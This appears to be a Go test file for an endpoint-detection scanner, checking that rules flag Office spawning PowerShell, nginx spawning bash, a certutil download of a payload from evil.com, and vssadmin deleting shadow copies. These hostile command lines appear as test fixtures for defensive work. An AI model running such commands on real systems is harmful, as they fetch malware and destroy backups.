package edr

import (
	"testing"

	"github.com/syslog-platform/logger/internal/models"
)

func TestEDRRulesOfficeSpawn(t *testing.T) {
	scanner := NewScanner()
	policy := &models.EndpointPolicyConfig{
		EDRBehaviorEnabled:      true,
		EDRMonitorScriptEngines: true,
		EDRBlockLOLBins:         true,
	}

	p := ProcessInfo{
		PID:               1024,
		PPID:              512,
		Name:              "powershell.exe",
		CommandLine:       "powershell.exe -NoProfile -ExecutionPolicy Bypass",
		ParentName:        "WINWORD.EXE",
		ParentCommandLine: `"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "invoice.docm"`,
	}

	matches := scanner.evaluateRules(p, policy)
	if len(matches) == 0 {
		t.Fatalf("expected rule match for Office spawning PowerShell, got 0")
	}

	found := false
	for _, m := range matches {
		if m.RuleID == "EDR-RULE-OFFICE-SPAWN" {
			found = true
			if m.Severity != "critical" {
				t.Errorf("expected critical severity, got %s", m.Severity)
			}
		}
	}
	if !found {
		t.Errorf("expected EDR-RULE-OFFICE-SPAWN, got %+v", matches)
	}
}

func TestEDRRulesWebShell(t *testing.T) {
	scanner := NewScanner()
	policy := &models.EndpointPolicyConfig{
		EDRBehaviorEnabled:      true,
		EDRMonitorScriptEngines: true,
		EDRBlockLOLBins:         true,
	}

	p := ProcessInfo{
		PID:               2048,
		PPID:              100,
		Name:              "bash",
		CommandLine:       "/bin/bash -c whoami",
		ParentName:        "nginx",
		ParentCommandLine: "nginx: worker process",
	}

	matches := scanner.evaluateRules(p, policy)
	if len(matches) == 0 {
		t.Fatalf("expected rule match for nginx spawning bash, got 0")
	}

	found := false
	for _, m := range matches {
		if m.RuleID == "EDR-RULE-WEBSHELL" {
			found = true
			if m.Severity != "critical" {
				t.Errorf("expected critical severity, got %s", m.Severity)
			}
		}
	}
	if !found {
		t.Errorf("expected EDR-RULE-WEBSHELL, got %+v", matches)
	}
}

func TestEDRRulesLOLBinCertutil(t *testing.T) {
	scanner := NewScanner()
	policy := &models.EndpointPolicyConfig{
		EDRBehaviorEnabled:      true,
		EDRMonitorScriptEngines: true,
		EDRBlockLOLBins:         true,
	}

	p := ProcessInfo{
		PID:               3000,
		PPID:              2000,
		Name:              "certutil.exe",
		CommandLine:       "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe",
		ParentName:        "cmd.exe",
		ParentCommandLine: "cmd.exe",
	}

	matches := scanner.evaluateRules(p, policy)
	found := false
	for _, m := range matches {
		if m.RuleID == "EDR-RULE-LOLBIN-CERTUTIL" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected EDR-RULE-LOLBIN-CERTUTIL, got %+v", matches)
	}
}

func TestEDRRulesRansomwareInhibit(t *testing.T) {
	scanner := NewScanner()
	policy := &models.EndpointPolicyConfig{
		EDRBehaviorEnabled:      true,
		EDRMonitorScriptEngines: true,
		EDRBlockLOLBins:         true,
	}

	p := ProcessInfo{
		PID:               4000,
		PPID:              3500,
		Name:              "vssadmin.exe",
		CommandLine:       "vssadmin.exe delete shadows /all /quiet",
		ParentName:        "cmd.exe",
		ParentCommandLine: "cmd.exe",
	}

	matches := scanner.evaluateRules(p, policy)
	found := false
	for _, m := range matches {
		if m.RuleID == "EDR-RULE-RANSOMWARE-INHIBIT" {
			found = true
			if m.Severity != "critical" {
				t.Errorf("expected critical severity, got %s", m.Severity)
			}
		}
	}
	if !found {
		t.Errorf("expected EDR-RULE-RANSOMWARE-INHIBIT, got %+v", matches)
	}
}
